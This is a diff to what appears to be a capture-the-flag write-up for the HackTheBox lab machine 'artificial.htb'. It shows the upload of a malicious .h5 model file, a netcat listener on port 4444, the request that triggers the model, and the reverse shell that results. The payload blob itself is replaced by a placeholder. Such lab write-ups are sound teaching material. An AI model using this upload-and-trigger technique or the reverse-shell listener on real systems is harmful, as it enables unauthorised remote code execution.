@@ -228,6 +228,33 @@ Connection: keep-alive
 Content-Disposition: form-data; name="model_file"; filename="exploit.h5"
 Content-Type: application/x-hdf
 
-HDF
-
+[placeholder for file blob]
+------WebKitFormBoundaryTicDHAyJc5Hia94Y--
+```
+
+Then, I start a netcat listener:
+```
+nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+Finally, I run the model from the dashboard:
+```
+GET /run_model/ef74c658-cbcf-4601-96c6-965fd87e6788 HTTP/1.1
+Host: artificial.htb
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://artificial.htb/dashboard
+Accept-Encoding: gzip, deflate, br
+Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.tHU1-Tac2fUPZ92LKzRzetX4GbE
+Connection: keep-alive
+```
+
+I get a connection on the netcat listener:
+```
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 56218
+/bin/sh: 0: can't access tty; job control turned off
+$ 
 ```
